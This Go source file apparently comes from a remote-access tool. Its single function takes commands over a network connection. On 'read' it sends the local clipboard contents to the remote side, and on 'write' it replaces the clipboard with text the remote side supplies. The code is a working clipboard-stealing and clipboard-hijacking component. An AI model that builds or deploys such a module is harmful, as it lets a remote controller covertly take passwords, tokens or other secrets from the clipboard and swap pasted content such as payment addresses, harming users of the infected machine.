package clipboard

import (
	"bufio"
	"fmt"
	"github.com/atotto/clipboard"
	"net"
	"strings"
)

func Write(connection net.Conn) (err error) {

	reader := bufio.NewReader(connection)
	clip_command, err := reader.ReadString('\n')
	command := strings.TrimSpace(clip_command)
	if command == "stop" {
		return
	}
	if command == "read" {
		text, _ := clipboard.ReadAll()
		nbytes, err := connection.Write([]byte(text + "\n"))
		if err != nil {
			panic(err)
		}
		fmt.Println("[+]", nbytes, "bytes written\n")
	}
	if command == "write" {
		fmt.Println("entered")
		reader := bufio.NewReader(connection)
		clip_write, err := reader.ReadString('\n')
		if err != nil {
			panic(err)
		}
		write := strings.TrimSpace(clip_write)
		clipboard.WriteAll(write)
	}
	return
}
